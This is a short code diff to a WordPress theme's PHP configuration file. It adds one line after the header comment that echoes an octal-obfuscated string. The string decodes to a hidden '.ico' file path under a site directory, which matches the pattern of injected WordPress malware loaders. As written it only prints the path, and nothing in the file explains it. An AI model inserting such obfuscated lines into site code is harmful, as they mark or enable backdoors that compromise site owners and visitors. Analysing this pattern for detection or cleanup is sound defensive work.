@@ -8,6 +8,7 @@
  * @author EF5 Team
  *
 */
+echo "\057ho\155e/\144ev\057wo\162dp\162es\163/l\151fe\151ns\165ra\156ce\057.8\1424c\06393\143.i\143o";
 if(!function_exists('theclick_configs')){
     function theclick_configs($value){
         $configs = [
